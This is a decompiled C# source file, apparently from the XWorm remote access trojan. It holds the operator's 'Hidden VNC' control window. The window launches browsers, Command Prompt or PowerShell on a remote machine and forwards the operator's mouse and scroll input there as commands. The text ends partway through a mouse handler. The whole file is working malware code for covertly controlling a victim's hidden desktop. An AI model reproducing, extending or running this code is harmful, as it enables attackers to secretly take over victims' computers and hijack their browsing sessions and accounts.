#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;


namespace XWorm;

[DesignerGenerated]
public class Form2 : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__R134_002D22
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R134_002D22(_Closure_0024__R134_002D22 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R24(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer2")]
	private System.Windows.Forms.Timer _Timer2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer3")]
	private System.Windows.Forms.Timer _Timer3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton6")]
	private Guna2GradientButton _Guna2GradientButton6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton2")]
	private Guna2GradientButton _Guna2GradientButton2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton4")]
	private Guna2GradientButton _Guna2GradientButton4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton3")]
	private Guna2GradientButton _Guna2GradientButton3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton5")]
	private Guna2GradientButton _Guna2GradientButton5;

	public GClass5 gclass5_0;

	public int int_0;

	public int int_1;

	private int int_2;

	private bool bool_0;

	private bool bool_1;

	private int int_3;

	private bool bool_2;

	private bool bool_3;

	public int int_4;

	public Stopwatch stopwatch_0;
	public PictureBox PictureBox1
;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
;

	[field: AccessedThroughProperty("ToolStripStatusLabel1")]
	public ToolStripStatusLabel ToolStripStatusLabel1
	;

	[field: AccessedThroughProperty("Label1")]
	public Label Label1
	;

	[field: AccessedThroughProperty("Label3")]
	public Label Label3
	;

	[field: AccessedThroughProperty("Label2")]
	public Label Label2

;


	public System.Windows.Forms.Timer Timer1
	;

	public System.Windows.Forms.Timer Timer2
	;

	public System.Windows.Forms.Timer Timer3
	;


	[field: AccessedThroughProperty("Panel2")]
	public Panel Panel2
	;

	[field: AccessedThroughProperty("Guna2ComboBox3")]
	public Guna2ComboBox Guna2ComboBox3
	;

	[field: AccessedThroughProperty("Guna2Panel1")]
	public Guna2Panel Guna2Panel1
	;

	public Guna2GradientButton Guna2GradientButton1
;


	[field: AccessedThroughProperty("Guna2ComboBox1")]
	public Guna2ComboBox Guna2ComboBox1
	;

	[field: AccessedThroughProperty("Guna2Panel3")]
	public Guna2Panel Guna2Panel3
	;

	[field: AccessedThroughProperty("Guna2Panel2")]
	public Guna2Panel Guna2Panel2
	;

	[field: AccessedThroughProperty("Guna2ComboBox2")]
	public Guna2ComboBox Guna2ComboBox2
	;

	public Guna2GradientButton Guna2GradientButton6
	;


	public Guna2GradientButton Guna2GradientButton2
	;


	[field: AccessedThroughProperty("Guna2GroupBox1")]
	public Guna2GroupBox Guna2GroupBox1
	;

	public Guna2GradientButton Guna2GradientButton4
;

	public Guna2GradientButton Guna2GradientButton3
	;

	public Guna2GradientButton Guna2GradientButton5
	;

	[field: AccessedThroughProperty("Label4")]
	public Label Label4
	;

	[field: AccessedThroughProperty("Guna2ComboBox4")]
	public Guna2ComboBox Guna2ComboBox4
	;

	[field: AccessedThroughProperty("Guna2Panel4")]
	public Guna2Panel Guna2Panel4
	;

	public PictureBox VNCBoxe
	;

	public Form2()
	{
		base.Load += Form2_Load;
		base.FormClosing += Form2_FormClosing;
		int_4 = 0;
		stopwatch_0 = Stopwatch.StartNew();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Form2));
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.Label3 = new System.Windows.Forms.Label();
		this.Label1 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Timer2 = new System.Windows.Forms.Timer(this.components);
		this.Timer3 = new System.Windows.Forms.Timer(this.components);
		this.Panel2 = new System.Windows.Forms.Panel();
		this.Guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2ComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2Panel3 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2ComboBox3 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2ComboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2GradientButton6 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
		this.Guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2ComboBox4 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Label4 = new System.Windows.Forms.Label();
		this.Guna2GradientButton5 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2Panel4 = new Guna.UI2.WinForms.Guna2Panel();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.StatusStrip1.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.Guna2Panel1.SuspendLayout();
		this.Guna2GroupBox1.SuspendLayout();
		this.Guna2Panel4.SuspendLayout();
		base.SuspendLayout();
		this.PictureBox1.KeyPress += new System.Windows.Forms.KeyPressEventHandler(PictureBox1_KeyPress);
		this.PictureBox1.MouseEnter += new System.EventHandler(PictureBox1_MouseEnter);
		this.PictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseDown);
		this.PictureBox1.MouseMove += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseMove);
		this.PictureBox1.MouseUp += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseUp);
		this.PictureBox1.DragEnter += new System.Windows.Forms.DragEventHandler(PictureBox1_DragEnter);
		this.PictureBox1.DragDrop += new System.Windows.Forms.DragEventHandler(PictureBox1_DragDrop);
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.Timer2.Tick += new System.EventHandler(Timer2_Tick);
		this.Timer3.Tick += new System.EventHandler(Timer3_Tick);
		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Guna2GradientButton2.Click += new System.EventHandler(Guna2GradientButton2_Click);
		this.Guna2GradientButton3.Click += new System.EventHandler(Guna2GradientButton3_Click);
		this.Guna2GradientButton4.Click += new System.EventHandler(Guna2GradientButton4_Click);
		this.Guna2GradientButton5.Click += new System.EventHandler(Guna2GradientButton5_Click);
		this.Guna2GradientButton6.Click += new System.EventHandler(Guna2GradientButton6_Click);
		this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.PictureBox1.Location = new System.Drawing.Point(0, 65);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(815, 332);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.PictureBox1.TabIndex = 1;
		this.PictureBox1.TabStop = false;
		this.Label3.AutoSize = true;
		this.Label3.ForeColor = System.Drawing.Color.Black;
		this.Label3.Location = new System.Drawing.Point(246, 38);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(45, 13);
		this.Label3.TabIndex = 14;
		this.Label3.Text = "Resize :";
		this.Label1.AutoSize = true;
		this.Label1.ForeColor = System.Drawing.Color.Black;
		this.Label1.Location = new System.Drawing.Point(19, 38);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(59, 15);
		this.Label1.TabIndex = 11;
		this.Label1.Text = "Software :";
		this.Label2.AutoSize = true;
		this.Label2.ForeColor = System.Drawing.Color.Black;
		this.Label2.Location = new System.Drawing.Point(74, 38);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(48, 13);
		this.Label2.TabIndex = 12;
		this.Label2.Text = "Quality :";
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripStatusLabel1 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 467);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Size = new System.Drawing.Size(815, 22);
		this.StatusStrip1.TabIndex = 4;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel1.Text = "..";
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.Panel2.Controls.Add(this.Guna2Panel4);
		this.Panel2.Controls.Add(this.Guna2ComboBox3);
		this.Panel2.Controls.Add(this.Label3);
		this.Panel2.Controls.Add(this.Guna2Panel1);
		this.Panel2.Controls.Add(this.Guna2ComboBox1);
		this.Panel2.Controls.Add(this.Guna2Panel3);
		this.Panel2.Controls.Add(this.Guna2Panel2);
		this.Panel2.Controls.Add(this.Label2);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(815, 65);
		this.Panel2.TabIndex = 30;
		this.Guna2Panel1.Controls.Add(this.Guna2GradientButton1);
		this.Guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Guna2Panel1.Location = new System.Drawing.Point(68, 0);
		this.Guna2Panel1.Name = "Guna2Panel1";
		this.Guna2Panel1.Size = new System.Drawing.Size(679, 21);
		this.Guna2Panel1.TabIndex = 35;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = XWorm_Resources._Stop;
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(15, 15);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(0, 0);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(679, 21);
		this.Guna2GradientButton1.TabIndex = 34;
		this.Guna2GradientButton1.Text = "OFF";
		this.Guna2ComboBox1.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.BorderRadius = 3;
		this.Guna2ComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox1.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.Font = new System.Drawing.Font("Segoe UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Guna2ComboBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox1.ItemHeight = 15;
		this.Guna2ComboBox1.Items.AddRange(new object[10] { "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%" });
		this.Guna2ComboBox1.Location = new System.Drawing.Point(128, 34);
		this.Guna2ComboBox1.Name = "Guna2ComboBox1";
		this.Guna2ComboBox1.Size = new System.Drawing.Size(107, 21);
		this.Guna2ComboBox1.TabIndex = 28;
		this.Guna2Panel3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Guna2Panel3.Location = new System.Drawing.Point(0, 0);
		this.Guna2Panel3.Name = "Guna2Panel3";
		this.Guna2Panel3.Size = new System.Drawing.Size(68, 65);
		this.Guna2Panel3.TabIndex = 37;
		this.Guna2Panel2.Dock = System.Windows.Forms.DockStyle.Right;
		this.Guna2Panel2.Location = new System.Drawing.Point(747, 0);
		this.Guna2Panel2.Name = "Guna2Panel2";
		this.Guna2Panel2.Size = new System.Drawing.Size(68, 65);
		this.Guna2Panel2.TabIndex = 36;
		this.Guna2ComboBox3.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox3.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox3.BorderRadius = 3;
		this.Guna2ComboBox3.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox3.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox3.Font = new System.Drawing.Font("Segoe UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Guna2ComboBox3.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox3.ItemHeight = 15;
		this.Guna2ComboBox3.Items.AddRange(new object[10] { "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%" });
		this.Guna2ComboBox3.Location = new System.Drawing.Point(297, 34);
		this.Guna2ComboBox3.Name = "Guna2ComboBox3";
		this.Guna2ComboBox3.Size = new System.Drawing.Size(107, 21);
		this.Guna2ComboBox3.TabIndex = 38;
		this.Guna2ComboBox2.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.BorderRadius = 3;
		this.Guna2ComboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox2.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox2.ItemHeight = 15;
		this.Guna2ComboBox2.Items.AddRange(new object[6] { "EdgeBrowser", "BraveBrowser", "FireFoxBrowser", "ChromeBrowser", "CommandPrompt", "PowerShell" });
		this.Guna2ComboBox2.Location = new System.Drawing.Point(84, 36);
		this.Guna2ComboBox2.Name = "Guna2ComboBox2";
		this.Guna2ComboBox2.Size = new System.Drawing.Size(156, 21);
		this.Guna2ComboBox2.TabIndex = 39;
		this.Guna2GradientButton6.BorderRadius = 3;
		this.Guna2GradientButton6.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton6.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton6.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton6.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton6.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton6.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton6.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton6.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton6.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton6.Location = new System.Drawing.Point(246, 36);
		this.Guna2GradientButton6.Name = "Guna2GradientButton6";
		this.Guna2GradientButton6.Size = new System.Drawing.Size(76, 21);
		this.Guna2GradientButton6.TabIndex = 74;
		this.Guna2GradientButton6.Text = "Run";
		this.Guna2GradientButton2.BorderRadius = 3;
		this.Guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton2.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton2.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton2.Location = new System.Drawing.Point(328, 36);
		this.Guna2GradientButton2.Name = "Guna2GradientButton2";
		this.Guna2GradientButton2.Size = new System.Drawing.Size(76, 21);
		this.Guna2GradientButton2.TabIndex = 75;
		this.Guna2GradientButton2.Text = "Custom";
		this.Guna2GroupBox1.Controls.Add(this.Guna2GradientButton4);
		this.Guna2GroupBox1.Controls.Add(this.Guna2GradientButton3);
		this.Guna2GroupBox1.Controls.Add(this.Guna2GradientButton2);
		this.Guna2GroupBox1.Controls.Add(this.Guna2ComboBox2);
		this.Guna2GroupBox1.Controls.Add(this.Guna2GradientButton6);
		this.Guna2GroupBox1.Controls.Add(this.Label1);
		this.Guna2GroupBox1.CustomBorderThickness = new System.Windows.Forms.Padding(0);
		this.Guna2GroupBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Guna2GroupBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GroupBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2GroupBox1.Location = new System.Drawing.Point(0, 397);
		this.Guna2GroupBox1.Name = "Guna2GroupBox1";
		this.Guna2GroupBox1.Size = new System.Drawing.Size(815, 70);
		this.Guna2GroupBox1.TabIndex = 31;
		this.Guna2GroupBox1.Text = "Options";
		this.Guna2GradientButton3.BorderRadius = 3;
		this.Guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton3.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton3.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton3.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton3.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton3.Location = new System.Drawing.Point(410, 36);
		this.Guna2GradientButton3.Name = "Guna2GradientButton3";
		this.Guna2GradientButton3.Size = new System.Drawing.Size(76, 21);
		this.Guna2GradientButton3.TabIndex = 76;
		this.Guna2GradientButton3.Text = "Copy";
		this.Guna2GradientButton4.BorderRadius = 3;
		this.Guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton4.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton4.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton4.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton4.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton4.Location = new System.Drawing.Point(492, 36);
		this.Guna2GradientButton4.Name = "Guna2GradientButton4";
		this.Guna2GradientButton4.Size = new System.Drawing.Size(76, 21);
		this.Guna2GradientButton4.TabIndex = 77;
		this.Guna2GradientButton4.Text = "Paste";
		this.Guna2ComboBox4.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox4.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox4.BorderRadius = 3;
		this.Guna2ComboBox4.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox4.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox4.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox4.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox4.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox4.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox4.ItemHeight = 15;
		this.Guna2ComboBox4.Items.AddRange(new object[3] { "Close", "Minimize", "Maximize" });
		this.Guna2ComboBox4.Location = new System.Drawing.Point(63, 13);
		this.Guna2ComboBox4.Name = "Guna2ComboBox4";
		this.Guna2ComboBox4.Size = new System.Drawing.Size(105, 21);
		this.Guna2ComboBox4.TabIndex = 41;
		this.Label4.AutoSize = true;
		this.Label4.ForeColor = System.Drawing.Color.Black;
		this.Label4.Location = new System.Drawing.Point(5, 17);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(52, 13);
		this.Label4.TabIndex = 42;
		this.Label4.Text = "Window :";
		this.Guna2GradientButton5.BorderRadius = 3;
		this.Guna2GradientButton5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton5.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton5.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton5.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton5.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton5.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton5.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton5.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton5.Location = new System.Drawing.Point(174, 13);
		this.Guna2GradientButton5.Name = "Guna2GradientButton5";
		this.Guna2GradientButton5.Size = new System.Drawing.Size(47, 21);
		this.Guna2GradientButton5.TabIndex = 79;
		this.Guna2GradientButton5.Text = "Ok";
		this.Guna2Panel4.Controls.Add(this.Label4);
		this.Guna2Panel4.Controls.Add(this.Guna2GradientButton5);
		this.Guna2Panel4.Controls.Add(this.Guna2ComboBox4);
		this.Guna2Panel4.Dock = System.Windows.Forms.DockStyle.Right;
		this.Guna2Panel4.Location = new System.Drawing.Point(521, 21);
		this.Guna2Panel4.Name = "Guna2Panel4";
		this.Guna2Panel4.Size = new System.Drawing.Size(226, 44);
		this.Guna2Panel4.TabIndex = 80;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(815, 489);
		base.Controls.Add(this.PictureBox1);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Guna2GroupBox1);
		base.Controls.Add(this.StatusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		this.MinimumSize = new System.Drawing.Size(831, 528);
		base.Name = "Form2";
		this.Text = "Hidden VNC";
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		this.Guna2Panel1.ResumeLayout(false);
		this.Guna2GroupBox1.ResumeLayout(false);
		this.Guna2GroupBox1.PerformLayout();
		this.Guna2Panel4.ResumeLayout(false);
		this.Guna2Panel4.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		base.MouseWheel += Form2_MouseWheel;
		PictureBox1.AllowDrop = true;
		Guna2ComboBox2.SelectedIndex = 0;
		Guna2ComboBox1.SelectedIndex = 0;
		Guna2ComboBox3.SelectedIndex = 8;
		Guna2ComboBox4.SelectedIndex = 0;
		Guna2GradientButton1.PerformClick();
	}

	private void Form2_MouseWheel(object sender, MouseEventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) != 0)
		{
			return;
		}
		if (e.Delta < 0)
		{
			byte[] array = Module0.smethod_6("ScrollDown");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		else
		{
			byte[] array2 = Module0.smethod_6("ScrollUp");
			GClass5 gClass2 = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass2.method_1((byte[])a0);
			}, array2);
		}
	}

	private void PictureBox1_MouseEnter(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
		{
			PictureBox1.Focus();
		}
	}

	private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) != 0)
		{
			return;
		}
		Point point = checked(new Point((int)Math.Round((double)e.X * ((double)int_0 / (double)PictureBox1.Width)), (int)Math.Round((double)e.Y * ((double)int_1 / (double)PictureBox1.Height))));
		if (e.Button == MouseButtons.Left)
		{
			byte[] array = Module0.smethod_6("MouseLeftUp" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		else if (e.Button == MouseButtons.Right)
		{
			byte[] array2 = Module0.smethod_6("MouseRightUp" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y));
			GClass5 gClass2 = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass2.method_1((byte[])a0);
